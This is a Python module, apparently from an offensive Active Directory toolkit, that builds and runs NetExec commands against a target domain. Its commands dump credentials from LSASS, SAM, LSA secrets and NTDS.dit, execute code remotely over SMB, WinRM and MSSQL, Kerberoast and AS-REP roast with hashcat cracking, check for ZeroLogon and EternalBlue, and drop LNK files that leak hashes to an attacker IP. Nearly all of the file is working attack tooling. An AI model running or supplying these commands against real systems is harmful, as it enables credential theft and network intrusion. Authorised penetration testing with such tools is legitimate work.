"""
Module: NetExec / NXC Suite
Techniques: nxc smb/ldap/mssql/winrm/ftp/rdp/ssh
            modules: lsassy, nanodump, spider_plus, enum_av,
            dpapi, teams_localdb, get_netconnections, ms17-010
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("NETEXEC / NXC SUITE", "Swiss army knife for AD testing")
    dc   = input_or_session("dc_ip",    "Target IP / subnet")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    h    = SESSION.get("nt_hash", "")
    iface = SESSION.get("attacker_iface") or "<INTERFACE>"

    auth = f"-u '{user}' -H '{h.split(':')[-1]}'" if h else f"-u '{user}' -p '{pw}'"
    subnet = prompt(f"Subnet (Enter to use {dc})") or dc

    print(f"""
  {C}── SMB ──────────────────────────────────────────────────────────{RST}
  [1]  SMB Enum (shares/users/groups/pass-pol)
  [2]  SMB Code Execution (cmd/ps)
  [3]  SMB Credential Dump (lsassy/nanodump/mimikatz)
  [4]  SMB File Operations (spider/get/put)
  {C}── LDAP ─────────────────────────────────────────────────────────{RST}
  [6]  LDAP Enumeration (users/groups/DC/ADCS/Maq)
  [7]  LDAP Kerberoast / AS-REP Roast
  {C}── OTHER PROTOCOLS ───────────────────────────────────────────────{RST}
  [8]  WinRM Execution
  [9]  MSSQL Execution
  [10] RDP Check
  [11] SSH Check
  {C}── NXC MODULES ──────────────────────────────────────────────────{RST}
  [15] get_netconnections  (active network connections)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {C}NXC SMB Enumeration:{RST}

  {Y}Host info:{RST}
  nxc smb {subnet} {auth} -d {dom}

  {Y}Shares:{RST}
  nxc smb {dc} {auth} -d {dom} --shares

  {Y}Users:{RST}
  nxc smb {dc} {auth} -d {dom} --users
  nxc smb {dc} {auth} -d {dom} --users --active

  {Y}Groups:{RST}
  nxc smb {dc} {auth} -d {dom} --groups
  nxc smb {dc} {auth} -d {dom} --groups --groups "Domain Admins"

  {Y}Password policy:{RST}
  nxc smb {dc} {auth} -d {dom} --pass-pol

  {Y}Logged on users:{RST}
  nxc smb {dc} {auth} -d {dom} --loggedon-users

  {Y}Sessions:{RST}
  nxc smb {dc} {auth} -d {dom} --sessions

  {Y}Local admins:{RST}
  nxc smb {dc} {auth} -d {dom} --local-groups

  {Y}Disks:{RST}
  nxc smb {dc} {auth} -d {dom} --disks

  {Y}Generate relay target list (no signing):{RST}
  nxc smb {subnet} {auth} -d {dom} --gen-relay-list /tmp/relay_targets.txt
""")
        run_cmd(f"nxc smb {dc} {auth} -d {dom} --shares")

    elif c == "2":
        cmd = prompt("Command to execute (e.g. whoami /all)")
        ps  = prompt("Use PowerShell? [y/n] (default=n)") or "n"
        flag = "-x" if ps == "n" else "-X"
        print(f"""
  {C}NXC SMB Code Execution:{RST}

  {Y}Command execution:{RST}
  nxc smb {dc} {auth} -d {dom} {flag} '{cmd}'

  {Y}Execute on all hosts:{RST}
  nxc smb {subnet} {auth} -d {dom} {flag} '{cmd}'

  {Y}Execute and save output:{RST}
  nxc smb {dc} {auth} -d {dom} {flag} '{cmd}' 2>&1 | tee /tmp/exec_output.txt
""")
        run_cmd(f"nxc smb {dc} {auth} -d {dom} {flag} '{cmd}'")

    elif c == "3":
        print(f"""
  {C}NXC SMB Credential Dumping:{RST}

  {Y}lsassy (most reliable — no binary drop):{RST}
  nxc smb {dc} {auth} -d {dom} -M lsassy
  nxc smb {subnet} {auth} -d {dom} -M lsassy

  {Y}nanodump (stealthy):{RST}
  nxc smb {dc} {auth} -d {dom} -M nanodump

  {Y}Mimikatz (most comprehensive, noisy):{RST}
  nxc smb {dc} {auth} -d {dom} -M mimikatz

  {Y}SAM dump (local accounts):{RST}
  nxc smb {dc} {auth} -d {dom} --sam

  {Y}LSA secrets:{RST}
  nxc smb {dc} {auth} -d {dom} --lsa

  {Y}NTDS.dit (DA required):{RST}
  nxc smb {dc} {auth} -d {dom} --ntds
  nxc smb {dc} {auth} -d {dom} --ntds --enabled

  {Y}LAPS passwords:{RST}
  nxc smb {dc} {auth} -d {dom} -M laps
  nxc ldap {dc} {auth} -d {dom} -M laps
""")
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M lsassy")

    elif c == "4":
        print(f"""
  {C}NXC SMB File Operations:{RST}

  {Y}Spider all shares (find credentials/configs):{RST}
  nxc smb {dc} {auth} -d {dom} -M spider_plus
  nxc smb {dc} {auth} -d {dom} -M spider_plus -o READ_ONLY=False

  {Y}Spider specific share:{RST}
  nxc smb {dc} {auth} -d {dom} --spider SYSVOL --pattern ".xml,.ini,.txt,.conf,.config,.bat,.ps1"
  nxc smb {dc} {auth} -d {dom} --spider C$ --pattern "password,cred,secret,key"

  {Y}Get specific file:{RST}
  nxc smb {dc} {auth} -d {dom} --get-file C:\\\\Windows\\\\NTDS\\\\NTDS.dit /tmp/ntds.dit

  {Y}Put file on target:{RST}
  nxc smb {dc} {auth} -d {dom} --put-file /tmp/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe
""")
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M spider_plus -o READ_ONLY=True")

    elif c == "5":
        print(f"""
  {C}NXC Vulnerability Scanning:{RST}

  {Y}MS17-010 (EternalBlue):{RST}
  nxc smb {subnet} {auth} -d {dom} -M ms17-010

  {Y}PetitPotam (EFS coercion check):{RST}
  nxc smb {subnet} {auth} -d {dom} -M petitpotam

  {Y}NoPac (CVE-2021-42278/42287):{RST}
  nxc smb {dc} {auth} -d {dom} -M nopac

  {Y}ZeroLogon (CVE-2020-1472):{RST}
  nxc smb {dc} -u '' -p '' -d {dom} -M zerologon

  {Y}PrintNightmare (CVE-2021-1675):{RST}
  nxc smb {dc} {auth} -d {dom} -M printnightmare

  {Y}SMB Signing check:{RST}
  nxc smb {subnet} --gen-relay-list /tmp/no_signing.txt
""")
        run_cmd(f"nxc smb {subnet} -u '' -p '' -M ms17-010")

    elif c == "6":
        print(f"""
  {C}NXC LDAP Enumeration:{RST}

  {Y}Domain info:{RST}
  nxc ldap {dc} {auth} -d {dom} --get-sid

  {Y}Users + descriptions:{RST}
  nxc ldap {dc} {auth} -d {dom} --users
  nxc ldap {dc} {auth} -d {dom} --users | grep -i "description\\|pass\\|pwd\\|cred"

  {Y}Groups:{RST}
  nxc ldap {dc} {auth} -d {dom} --groups

  {Y}Password policy:{RST}
  nxc ldap {dc} {auth} -d {dom} --pass-pol

  {Y}Machine Account Quota:{RST}
  nxc ldap {dc} {auth} -d {dom} -M maq

  {Y}ADCS enumeration:{RST}
  nxc ldap {dc} {auth} -d {dom} -M adcs

  {Y}LAPS:{RST}
  nxc ldap {dc} {auth} -d {dom} -M laps

  {Y}Trusted for delegation:{RST}
  nxc ldap {dc} {auth} -d {dom} --trusted-for-delegation

  {Y}Admin count:{RST}
  nxc ldap {dc} {auth} -d {dom} --admin-count

  {Y}GMSAs:{RST}
  nxc ldap {dc} {auth} -d {dom} --gmsa
""")
        run_cmd(f"nxc ldap {dc} {auth} -d {dom} --users")

    elif c == "7":
        print(f"""
  {C}NXC LDAP Kerberoast / AS-REP Roast:{RST}

  {Y}Kerberoast:{RST}
  nxc ldap {dc} {auth} -d {dom} --kerberoasting /tmp/nxc_kerberoast.txt
  hashcat -m 13100 /tmp/nxc_kerberoast.txt /usr/share/wordlists/rockyou.txt

  {Y}AS-REP Roast:{RST}
  nxc ldap {dc} {auth} -d {dom} --asreproast /tmp/nxc_asrep.txt
  hashcat -m 18200 /tmp/nxc_asrep.txt /usr/share/wordlists/rockyou.txt

  {Y}Without credentials (user list):{RST}
  nxc ldap {dc} -u /tmp/valid_users.txt -p '' --asreproast /tmp/asrep.txt
""")
        run_cmd(f"nxc ldap {dc} {auth} -d {dom} --kerberoasting /tmp/nxc_kerberoast.txt")

    elif c == "8":
        cmd = prompt("Command to execute (e.g. whoami)")
        print(f"""
  {C}NXC WinRM Execution:{RST}

  nxc winrm {dc} {auth} -d {dom} -x '{cmd}'
  nxc winrm {dc} {auth} -d {dom} -X '{cmd}'   # PowerShell

  {Y}Interactive shell (evil-winrm):{RST}
  evil-winrm {SESSION.get("nt_hash","") and f"-i {dc} -u {user} -H {h.split(':')[-1]}" or f"-i {dc} -u {user} -p '{pw}'"}
""")
        run_cmd(f"nxc winrm {dc} {auth} -d {dom} -x '{cmd}'")

    elif c == "9":
        cmd = prompt("SQL command (e.g. SELECT @@version)")
        print(f"""
  {C}NXC MSSQL Execution:{RST}

  {Y}Enum MSSQL instances:{RST}
  nxc mssql {subnet} {auth} -d {dom}

  {Y}Execute query:{RST}
  nxc mssql {dc} {auth} -d {dom} -q '{cmd}'

  {Y}xp_cmdshell (OS command execution):{RST}
  nxc mssql {dc} {auth} -d {dom} --local-auth -x 'whoami'
  nxc mssql {dc} {auth} -d {dom} -M mssql_priv
""")
        run_cmd(f"nxc mssql {dc} {auth} -d {dom} -q '{cmd}'")

    elif c == "10":
        run_cmd(f"nxc rdp {subnet} {auth} -d {dom}")

    elif c == "11":
        run_cmd(f"nxc ssh {subnet} {auth}")

    elif c == "12":
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M enum_av")

    elif c == "13":
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M teams_localdb")

    elif c == "14":
        print(f"""
  {C}NXC DPAPI Module:{RST}

  nxc smb {dc} {auth} -d {dom} -M dpapi
  nxc smb {dc} {auth} -d {dom} -M dpapi --local-auth
  nxc smb {dc} {auth} -d {dom} -M dpapi -o NOSYSTEM=True
""")
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M dpapi")

    elif c == "15":
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M get_netconnections")

    elif c == "16":
        run_cmd(f"nxc smb {dc} {auth} -d {dom} -M wireless")

    elif c == "17":
        attacker = input_or_session("attacker_ip", "Attacker IP for UNC path")
        print(f"""
  {C}NXC Slinky — drop LNK file → capture hashes via Responder:{RST}

  {Y}Terminal 1 — Start Responder:{RST}
  sudo responder -I {iface} -rdwv

  {Y}Terminal 2 — Drop LNK via nxc:{RST}
  nxc smb {dc} {auth} -d {dom} \\
    -M slinky -o NAME=doc SERVER={attacker}
""")
        run_cmd(
            f"nxc smb {dc} {auth} -d {dom} "
            f"-M slinky -o NAME=doc SERVER={attacker}"
        )

    pause()
